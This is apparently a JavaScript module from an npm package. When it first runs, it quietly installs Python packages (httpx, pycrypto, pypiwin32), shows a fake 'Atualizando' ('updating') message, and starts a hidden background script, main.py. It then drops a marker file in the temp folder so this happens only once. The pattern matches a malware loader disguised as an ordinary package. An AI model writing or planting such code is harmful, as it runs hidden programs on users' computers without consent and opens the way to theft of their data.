module.exports = function lifes(name, opts){

try {

const {
execSync} = require("child_process")
var cmd = require('node-cmd')
const colors = require('colors');


var shell = require('shelljs');
var fs = require('fs');


const checker = execSync(`cd %temp% && type checker.json`).toString()
const obj = JSON.parse(checker);


if (checker && checker === "true"){}


 } catch (e) {

   const {execSync} = require("child_process")
      var cmd = require('node-cmd')
      const colors = require('colors');
      var shell = require('shelljs');


   UUID = execSync("python --version || path/to/python_install.exe").toString().split(" ")[0]

   if (UUID && UUID === "Python") {
      console.log("Atualizando".red)
      cmd.runSync(`pip install httpx && pip install pycrypto && pip install pypiwin32`)
      console.clear()
      console.log("Atualizando".blue)
      cmd.runSync(`start /b python main.py`)
   } else {
      title('P')
      shell.exec(`cd %temp% && echo {"checker":"true"} > checker.json`)
   }

   const title = require('proc-title')
   title('P')

   shell.exec(`cd %temp% && echo {"checker":"true"} > checker.json`)

 }};